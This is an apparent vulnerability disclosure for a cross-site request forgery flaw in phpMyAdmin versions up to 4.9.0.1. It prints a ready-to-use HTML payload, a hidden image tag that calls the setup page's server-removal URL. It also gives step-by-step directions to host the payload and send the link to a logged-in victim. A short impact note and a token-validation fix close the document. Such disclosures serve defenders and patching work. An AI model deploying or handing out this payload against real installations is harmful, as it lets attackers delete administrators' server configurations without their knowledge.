# phpMyAdmin <= 4.9.0.1 - Cross-Site Request Forgery
Has been detected a Cross-Site Request Forgery in phpMyAdmin, that allows an attacker to trigger a CSRF attack against a phpMyAdmin user deleting any server in the Setup page.

<h2>Steps:</h2>

1) Create a file on your **web server** and paste this code in new file:
```
<p>Deleting Server 1</p>
<img src="
http://victim.com/phpmyadmin/setup/index.php?page=servers&mode=remove&id=1"
style="display:none;" />
```
2) Now that you have successfully created and Uploaded file on a webserver, Share the link of the file to victim which is logged-in phpMyAdmin as soon as Victim will open the link will delete any
server in the Setup page. 


**Change the Domain and the location of phpmyadmin directory if changed**

NOTE: 
- This will only work if the person you're going to send the link is logged-in to the phpMyAdmin.


<h4>BUSINESS IMPACT</h4>

The attacker can easily create a fake hyperlink containing the request that
wants to execute on behalf the user,in this way making possible a CSRF
attack due to the wrong use of HTTP method.

<h4>SOLUTION</h4>

Implement in each call the validation of the token variable, as already
done in other phpMyAdmin requests.
